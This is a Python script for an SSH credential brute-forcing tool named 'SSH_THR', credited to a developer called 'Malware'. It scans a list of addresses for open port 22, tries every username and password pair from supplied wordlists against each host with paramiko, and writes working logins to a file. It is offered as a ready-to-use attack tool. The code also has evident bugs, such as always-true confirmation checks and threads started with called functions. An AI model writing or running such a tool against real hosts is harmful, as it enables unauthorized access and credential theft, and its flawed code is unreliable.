from colorama import Fore 
import time 
from pyfiglet import figlet_format
import paramiko
import threading
import os
import socket

def try_ssh_conn_prot():
	time.sleep(1)
	jttmw = 0
	print(Fore.RED + "Wait! We Need A User And Pass List, Enter Your User List First")
	dn = input(Fore.RED + 'ssh@thr:~$ ')
	if '.txt' in dn:
		print(Fore.GREEN + 'Valid List')
		jttmw += 1
	else:
		print(Fore.RED + 'Invalid List')
		try_ssh_conn_prot()
	dn2 = input(Fore.RED + 'ssh@thr:~$ ')
	if '.txt' in dn2:
		print(Fore.GREEN + 'Valid List')
		jttmw += 1
	else:
		print(Fore.RED + 'Invalid List')
		try_ssh_conn_prot()
	time.sleep(1)
	if jttmw == 2:
		print(Fore.GREEN + 'Both Lists Valid!')
		pass
	else:
		print(Fore.RED + 'One Or More Lists Are Invalid!')
		try_ssh_conn_prot()
	time.sleep(1)
	with open(dn,'rb') as r1:
		r12 = r1.readlines()
	with open(dn2,'rb') as r2:
		r13 = r2.readlines()
	sshc = paramiko.SSHClient()
	sshc.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	print(Fore.GREEN + 'All Values Successfully Configured.. Trying Bruteforce..')
	son = 0
	for addr in validl:
		for user in r12:
			for pass_ in r13:
				try:
					sshc.connect(addr,22,user,pass_)
					time.sleep(1)
					print(Fore.GREEN + 'Successful On %s:%s With %s and %s' %(addr,22,user,pass_))
					son += 1
					with open('successful_addr_save.txt','wb') as wrb1:
						wrb1.write("ADDR: %s | PORT: %s | USER: %s | PASS: %s" %(addr,22,user,pass_))
					time.sleep(2)
				except Exception:
						print(Fore.RED + 'Invalid On %s:%s with %s and %s' %(addr,22,user,pass_))
	time.sleep(1)
	if son > 1:
		print(Fore.GREEN + 'Successful Attempts %s' %(son))
	else:
		print(Fore.RED + 'No Successful Connections In This List | SON: %s | ' %(son))
		time.sleep(1)
		print(Fore.GREEN + 'Restarting In 3 Seconds..')
		time.sleep(3)
		get_list()

def try_con():
	global validl
	validl = []
	global invalidl
	invalidl = []
	with open(get_list_name,'rb') as f1:
		r2 = f1.readlines()
	if len(r2) > 300:
		print(Fore.RED + 'More Than 300 Addresses, This May Take A Minute...')
	else:
		pass
	for i in r2:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((i,22))
			validl.append(i)
		except Exception:
			invalidl.append(i)
	time.sleep(1)
	print(Fore.GREEN + 'Process Finished... %s Invalid ADDRS | %s Valid ADDRS' %(len(invalidl),len(validl)))
	if len(validl) == 0:
		print(Fore.RED + 'Sorry, Try Another List | No Valid Addresses | ')
		time.sleep(1)
		print(Fore.GREEN + 'Returning To Selection In 3 Seconds...')
		time.sleep(3)
		get_list()
	else:
		print(Fore.GREEN + 'Trying %s Valid ADDRS' %(len(validl)))
		threading.Thread(target=try_ssh_conn_prot(),daemon=True).start()

def get_list():
	time.sleep(1)
	global success
	success = []
	skip = False
	print(Fore.RED + 'Please Enter Your Address List, Format to .txt')
	print(Fore.RED + "PUT THIS PY FILE IN THE DIRECTORY OF YOUR LIST")
	global get_list_name
	get_list_name = input(Fore.RED + 'ssh@thr:~$ ')
	if get_list_name == 'e':
		time.sleep(1)
		print(Fore.RED + 'Exiting..')
		exit()
	for i in os.listdir(os.getcwd()):
		if '.txt' not in i:
			skip = True
			continue 
		if skip:
			skip = False
		success.append(i)
	for i in success:
		if get_list_name == i:
			print(Fore.GREEN + 'Confirm %s In %s?' %(get_list_name,os.path.abspath(get_list_name)))
			xcon = input(Fore.RED + 'ssh@thr:~$ ')
			if xcon == 'y' or 'Y':
				print(Fore.GREEN + '%s Confirmed.. Loading Address List..' %(get_list_name))
				threading.Thread(target=try_con(),daemon=True).start()
			elif xcon == 'yes' or 'Yes':
				print(Fore.GREEN + '%s Confirmed.. Loading Address List..')
				threading.Thread(target=try_con(),daemon=True).start()
		else:
			print(Fore.RED + '%s in %s Not Found..'%(get_list_name,os.getcwd()))
			get_list()

def launch_screen():
	time.sleep(1)
	print(Fore.RED + figlet_format('		                     SSH_THR',font='bubble'))
	print(Fore.LIGHTBLACK_EX + """
				========================================
				Project Developer: Malware
				Version: 1.0 
				Please Enter The Name Of Your Addr List
				========================================
				""")
	get_list()

if __name__ == '__main__':
	launch_screen()
